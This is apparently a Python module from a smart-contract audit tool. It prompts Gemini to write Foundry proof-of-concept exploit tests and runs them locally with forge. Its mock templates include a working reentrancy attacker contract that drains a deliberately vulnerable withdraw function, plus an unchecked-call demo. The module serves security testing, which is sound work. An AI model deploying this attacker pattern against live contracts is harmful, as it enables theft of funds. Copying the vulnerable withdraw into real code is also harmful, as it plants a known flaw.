"""Gemini-backed Proof of Concept generator using Foundry."""

from __future__ import annotations

import json
import re
import subprocess
import tempfile
from pathlib import Path
from typing import Any

import google.generativeai as genai
import structlog

from contract_auditor.models import (
    AuditConfig,
    ExploitPoC,
    FoundryTestResult,
    VulnerabilityReport,
    VulnerabilityType,
)

logger = structlog.get_logger()


POC_GENERATION_PROMPT = """You are an expert smart contract security researcher. Generate a Foundry test that proves this vulnerability exists.

## Vulnerability Details
- Type: {vuln_type}
- Title: {title}
- Contract: {contract_name}
- Function: {function_name}
- Severity: {severity}
- Description: {description}
- Attack Vector: {attack_vector}

## Instructions
Generate a complete Foundry test in Solidity that:
1. Sets up the vulnerable contract scenario
2. Deploys any necessary attacker contracts
3. Executes the exploit
4. Asserts that the exploit succeeded

The test MUST:
- Be a complete, compilable Solidity file
- Use Foundry's Test framework
- Include clear comments explaining each step
- Use descriptive function names

Respond with JSON in this format:
```json
{{
    "test_name": "test_exploitReentrancy",
    "description": "Demonstrates reentrancy attack to drain funds",
    "solidity_code": "// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n...",
    "setup_code": "// Any additional setup code",
    "attack_steps": ["Step 1", "Step 2", "Step 3"],
    "prerequisites": ["Attacker has some ETH", "Vulnerable contract has balance"]
}}
```

Respond with only the JSON, no additional text.
"""


class PoCGenerator:
    """Generates Proof of Concept exploits with explicit fallback metadata."""

    def __init__(self, config: AuditConfig) -> None:
        """Initialize the PoC generator.

        Args:
            config: Audit configuration
        """
        self.config = config
        self._model: Any = None

        if not config.mock_mode and config.gemini_api_key:
            genai.configure(api_key=config.gemini_api_key)
            self._model = genai.GenerativeModel(config.gemini_model)

    async def generate(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Generate a PoC exploit for a vulnerability.

        Args:
            vulnerability: Enriched vulnerability report

        Returns:
            Generated PoC exploit
        """
        if self.config.mock_mode:
            logger.info("poc_mock_mode_enabled", vulnerability_id=vulnerability.id)
            return self._get_mock_poc(vulnerability)

        return await self._generate_with_ai(vulnerability)

    async def generate_and_verify(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Generate and execute a PoC exploit.

        Args:
            vulnerability: Enriched vulnerability report

        Returns:
            PoC with execution results
        """
        poc = await self.generate(vulnerability)

        if self.config.mock_mode:
            # Return mock success
            return ExploitPoC(
                vulnerability_id=poc.vulnerability_id,
                name=poc.name,
                description=poc.description,
                solidity_code=poc.solidity_code,
                setup_code=poc.setup_code,
                attack_steps=poc.attack_steps,
                prerequisites=poc.prerequisites,
                executed=True,
                success=True,
                execution_output="MOCK MODE: [PASS] test_exploit (gas: 123456)",
                gas_used=123456,
                generation_source=poc.generation_source,
                generation_error=poc.generation_error,
            )

        return await self._execute_poc(poc)

    async def batch_generate(self, vulnerabilities: list[VulnerabilityReport]) -> list[ExploitPoC]:
        """Generate PoCs for multiple vulnerabilities.

        Args:
            vulnerabilities: List of vulnerability reports

        Returns:
            List of generated PoCs
        """
        pocs = []
        for vuln in vulnerabilities:
            poc = await self.generate(vuln)
            pocs.append(poc)

        return pocs

    async def _generate_with_ai(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Use AI to generate PoC code.

        Args:
            vulnerability: Vulnerability to exploit

        Returns:
            Generated PoC
        """
        logger.info(
            "generating_poc",
            vuln_id=vulnerability.id,
            vuln_type=vulnerability.vulnerability_type.value,
        )

        prompt = POC_GENERATION_PROMPT.format(
            vuln_type=vulnerability.vulnerability_type.value,
            title=vulnerability.title,
            contract_name=vulnerability.finding.contract_name,
            function_name=vulnerability.finding.function_name,
            severity=vulnerability.finding.severity.value,
            description=vulnerability.detailed_description,
            attack_vector=vulnerability.attack_vector,
        )

        if self._model is None:
            reason = "Gemini model is not configured"
            logger.warning(
                "poc_generation_model_unavailable",
                vulnerability_id=vulnerability.id,
                vuln_type=vulnerability.vulnerability_type.value,
                reason=reason,
            )
            return self._get_fallback_poc(vulnerability, reason)

        try:
            response = self._model.generate_content(prompt)
            poc_data = self._extract_json(response.text)

            return ExploitPoC(
                vulnerability_id=vulnerability.id,
                name=poc_data.get("test_name", f"test_exploit_{vulnerability.id}"),
                description=poc_data.get("description", "Generated exploit PoC"),
                solidity_code=poc_data.get("solidity_code", ""),
                setup_code=poc_data.get("setup_code", ""),
                attack_steps=poc_data.get("attack_steps", []),
                prerequisites=poc_data.get("prerequisites", []),
                generation_source="gemini",
            )

        except Exception as e:
            reason = f"Gemini PoC generation failed: {e}"
            logger.error(
                "poc_generation_error",
                vulnerability_id=vulnerability.id,
                error=str(e),
                exc_info=True,
            )
            return self._get_fallback_poc(vulnerability, reason)

    async def _execute_poc(self, poc: ExploitPoC) -> ExploitPoC:
        """Execute a PoC using Foundry.

        Args:
            poc: PoC to execute

        Returns:
            PoC with execution results
        """
        logger.info("executing_poc", poc_name=poc.name)

        # Write PoC to temp file
        with tempfile.TemporaryDirectory() as tmpdir:
            test_file = Path(tmpdir) / "test" / f"{poc.name}.t.sol"
            test_file.parent.mkdir(parents=True, exist_ok=True)
            test_file.write_text(poc.solidity_code)

            # Initialize foundry project
            try:
                init_result = subprocess.run(
                    [self.config.forge_path, "init", "--no-commit", "--no-git"],
                    cwd=tmpdir,
                    capture_output=True,
                    text=True,
                )
            except FileNotFoundError as e:
                logger.error(
                    "foundry_init_tool_not_found",
                    poc_name=poc.name,
                    path=self.config.forge_path,
                    error=str(e),
                )
                return ExploitPoC(
                    vulnerability_id=poc.vulnerability_id,
                    name=poc.name,
                    description=poc.description,
                    solidity_code=poc.solidity_code,
                    setup_code=poc.setup_code,
                    attack_steps=poc.attack_steps,
                    prerequisites=poc.prerequisites,
                    executed=False,
                    success=False,
                    execution_output=f"Forge binary not found: {self.config.forge_path}",
                    generation_source=poc.generation_source,
                    generation_error=poc.generation_error,
                )

            if init_result.returncode != 0:
                output = init_result.stdout + init_result.stderr
                logger.error(
                    "foundry_init_failed",
                    poc_name=poc.name,
                    returncode=init_result.returncode,
                    output=output[:500],
                )
                return ExploitPoC(
                    vulnerability_id=poc.vulnerability_id,
                    name=poc.name,
                    description=poc.description,
                    solidity_code=poc.solidity_code,
                    setup_code=poc.setup_code,
                    attack_steps=poc.attack_steps,
                    prerequisites=poc.prerequisites,
                    executed=False,
                    success=False,
                    execution_output=f"Foundry project initialization failed: {output[:2000]}",
                    generation_source=poc.generation_source,
                    generation_error=poc.generation_error,
                )

            try:
                result = subprocess.run(
                    [self.config.forge_path, "test", "-vvv", "--match-test", poc.name],
                    cwd=tmpdir,
                    capture_output=True,
                    text=True,
                    timeout=120,
                )

                success = result.returncode == 0
                output = result.stdout + result.stderr

                # Extract gas used
                gas_match = re.search(r"gas:\s*(\d+)", output)
                gas_used = int(gas_match.group(1)) if gas_match else 0

                return ExploitPoC(
                    vulnerability_id=poc.vulnerability_id,
                    name=poc.name,
                    description=poc.description,
                    solidity_code=poc.solidity_code,
                    setup_code=poc.setup_code,
                    attack_steps=poc.attack_steps,
                    prerequisites=poc.prerequisites,
                    executed=True,
                    success=success,
                    execution_output=output[:2000],  # Truncate long output
                    gas_used=gas_used,
                    generation_source=poc.generation_source,
                    generation_error=poc.generation_error,
                )

            except subprocess.TimeoutExpired:
                logger.error("poc_execution_timeout", poc_name=poc.name)
                return ExploitPoC(
                    vulnerability_id=poc.vulnerability_id,
                    name=poc.name,
                    description=poc.description,
                    solidity_code=poc.solidity_code,
                    setup_code=poc.setup_code,
                    attack_steps=poc.attack_steps,
                    prerequisites=poc.prerequisites,
                    executed=True,
                    success=False,
                    execution_output="Execution timed out",
                    generation_source=poc.generation_source,
                    generation_error=poc.generation_error,
                )
            except FileNotFoundError as e:
                logger.error(
                    "poc_execution_tool_not_found",
                    poc_name=poc.name,
                    path=self.config.forge_path,
                    error=str(e),
                )
                return ExploitPoC(
                    vulnerability_id=poc.vulnerability_id,
                    name=poc.name,
                    description=poc.description,
                    solidity_code=poc.solidity_code,
                    setup_code=poc.setup_code,
                    attack_steps=poc.attack_steps,
                    prerequisites=poc.prerequisites,
                    executed=False,
                    success=False,
                    execution_output=f"Forge binary not found: {self.config.forge_path}",
                    generation_source=poc.generation_source,
                    generation_error=poc.generation_error,
                )
            except Exception as e:
                logger.error("poc_execution_error", poc_name=poc.name, error=str(e), exc_info=True)
                return ExploitPoC(
                    vulnerability_id=poc.vulnerability_id,
                    name=poc.name,
                    description=poc.description,
                    solidity_code=poc.solidity_code,
                    setup_code=poc.setup_code,
                    attack_steps=poc.attack_steps,
                    prerequisites=poc.prerequisites,
                    executed=False,
                    success=False,
                    execution_output=str(e),
                    generation_source=poc.generation_source,
                    generation_error=poc.generation_error,
                )

    def run_foundry_test(self, test_file: str, test_name: str) -> FoundryTestResult:
        """Run a specific Foundry test.

        Args:
            test_file: Path to test file
            test_name: Name of test function

        Returns:
            Test execution result
        """
        if self.config.mock_mode:
            logger.info("foundry_mock_mode_enabled", test_file=test_file, test_name=test_name)
            return FoundryTestResult(
                test_name=test_name,
                passed=True,
                gas_used=100000,
                logs=["MOCK MODE: exploit marked successful for demo/testing only"],
            )

        try:
            result = subprocess.run(
                [
                    self.config.forge_path,
                    "test",
                    "--match-test",
                    test_name,
                    "-vvv",
                ],
                cwd=Path(test_file).parent,
                capture_output=True,
                text=True,
                timeout=120,
            )

            passed = result.returncode == 0
            output = result.stdout + result.stderr

            # Parse logs
            logs = [line for line in output.split("\n") if "emit" in line.lower()]

            # Extract gas
            gas_match = re.search(r"gas:\s*(\d+)", output)
            gas_used = int(gas_match.group(1)) if gas_match else 0

            return FoundryTestResult(
                test_name=test_name,
                passed=passed,
                gas_used=gas_used,
                logs=logs,
                error_message="" if passed else output[-500:],
            )

        except Exception as e:
            logger.error(
                "foundry_test_error",
                test_file=test_file,
                test_name=test_name,
                error=str(e),
                exc_info=True,
            )
            return FoundryTestResult(
                test_name=test_name,
                passed=False,
                error_message=str(e),
            )

    def _extract_json(self, text: str) -> dict[str, Any]:
        """Extract JSON from AI response.

        Args:
            text: Raw AI response

        Returns:
            Parsed JSON dictionary
        """
        # Try to find JSON in code blocks
        json_match = re.search(r"```(?:json)?\s*([\s\S]*?)```", text)
        if json_match:
            try:
                return json.loads(json_match.group(1))
            except json.JSONDecodeError:
                pass

        try:
            return json.loads(text)
        except json.JSONDecodeError:
            pass

        return {}

    def _get_mock_poc(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Generate mock PoC for testing.

        Args:
            vulnerability: Target vulnerability

        Returns:
            Mock PoC
        """
        if vulnerability.vulnerability_type == VulnerabilityType.REENTRANCY:
            poc = self._get_reentrancy_poc(vulnerability)
        elif vulnerability.vulnerability_type == VulnerabilityType.UNCHECKED_CALL:
            poc = self._get_unchecked_call_poc(vulnerability)
        else:
            poc = self._get_generic_poc(vulnerability)

        return poc.model_copy(update={"generation_source": "mock"})

    def _get_reentrancy_poc(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Generate reentrancy exploit PoC."""
        contract_name = vulnerability.finding.contract_name or "VulnerableContract"
        function_name = vulnerability.finding.function_name or "withdraw"

        solidity_code = f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Simplified vulnerable contract for testing
contract {contract_name} {{
    mapping(address => uint256) public balances;

    function deposit() external payable {{
        balances[msg.sender] += msg.value;
    }}

    function {function_name}() external {{
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // Vulnerable: external call before state update
        (bool success, ) = msg.sender.call{{value: amount}}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }}
}}

contract Attacker {{
    {contract_name} public target;
    uint256 public attackCount;

    constructor(address _target) {{
        target = {contract_name}(_target);
    }}

    function attack() external payable {{
        target.deposit{{value: msg.value}}();
        target.{function_name}();
    }}

    receive() external payable {{
        if (address(target).balance >= 1 ether && attackCount < 10) {{
            attackCount++;
            target.{function_name}();
        }}
    }}
}}

contract ReentrancyExploitTest is Test {{
    {contract_name} public vulnerable;
    Attacker public attacker;

    function setUp() public {{
        vulnerable = new {contract_name}();
        attacker = new Attacker(address(vulnerable));

        // Fund the vulnerable contract
        vm.deal(address(this), 10 ether);
        vulnerable.deposit{{value: 10 ether}}();
    }}

    function test_exploitReentrancy() public {{
        uint256 initialBalance = address(vulnerable).balance;
        assertEq(initialBalance, 10 ether);

        // Fund attacker
        vm.deal(address(attacker), 1 ether);

        // Execute attack
        attacker.attack{{value: 1 ether}}();

        // Verify exploit succeeded - attacker drained funds
        assertLt(address(vulnerable).balance, initialBalance);
        assertGt(address(attacker).balance, 1 ether);
    }}
}}
"""

        return ExploitPoC(
            vulnerability_id=vulnerability.id,
            name="test_exploitReentrancy",
            description=f"Demonstrates reentrancy attack on {contract_name}.{function_name}",
            solidity_code=solidity_code,
            setup_code="Deploy vulnerable contract with 10 ETH balance",
            attack_steps=[
                "Deploy attacker contract pointing to vulnerable contract",
                "Attacker deposits 1 ETH into vulnerable contract",
                "Attacker calls withdraw",
                "In receive(), attacker recursively calls withdraw",
                "Attacker drains contract before balance is updated",
            ],
            prerequisites=[
                "Attacker has some initial ETH",
                "Vulnerable contract has ETH balance to drain",
            ],
        )

    def _get_unchecked_call_poc(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Generate unchecked call exploit PoC."""
        return ExploitPoC(
            vulnerability_id=vulnerability.id,
            name="test_exploitUncheckedCall",
            description="Demonstrates unchecked call vulnerability",
            solidity_code="""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract UncheckedCallTest is Test {
    function test_uncheckedCallFails() public {
        // Demonstrate that unchecked calls can silently fail
        address target = address(0x1234);

        // This call fails but contract doesn't revert
        (bool success, ) = target.call("");

        // Without checking success, the contract continues
        assertFalse(success);
    }
}
""",
            setup_code="",
            attack_steps=[
                "Identify contract that doesn't check call return value",
                "Trigger condition that causes the call to fail",
                "Contract continues execution with stale state",
            ],
            prerequisites=["Access to trigger the unchecked call"],
        )

    def _get_generic_poc(self, vulnerability: VulnerabilityReport) -> ExploitPoC:
        """Generate generic exploit PoC."""
        return ExploitPoC(
            vulnerability_id=vulnerability.id,
            name=f"test_exploit_{vulnerability.id}",
            description=f"PoC for {vulnerability.title}",
            solidity_code=f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract GenericExploitTest is Test {{
    function test_vulnerability() public {{
        // TODO: Implement specific exploit for {vulnerability.vulnerability_type.value}
        // Vulnerability: {vulnerability.title}
        // Contract: {vulnerability.finding.contract_name}
        // Function: {vulnerability.finding.function_name}

        assertTrue(true, "Placeholder test");
    }}
}}
""",
            setup_code="",
            attack_steps=["Review vulnerability details", "Implement specific exploit"],
            prerequisites=[],
        )

    def _get_fallback_poc(
        self, vulnerability: VulnerabilityReport, reason: str = "Gemini PoC generation failed"
    ) -> ExploitPoC:
        """Generate fallback PoC when AI fails."""
        poc = self._get_generic_poc(vulnerability)
        return poc.model_copy(
            update={
                "generation_source": "fallback",
                "generation_error": reason,
            }
        )


def create_poc_generator(config: AuditConfig | None = None) -> PoCGenerator:
    """Factory function to create PoCGenerator.

    Args:
        config: Optional audit configuration

    Returns:
        Configured PoCGenerator instance
    """
    if config is None:
        config = AuditConfig()

    return PoCGenerator(config)
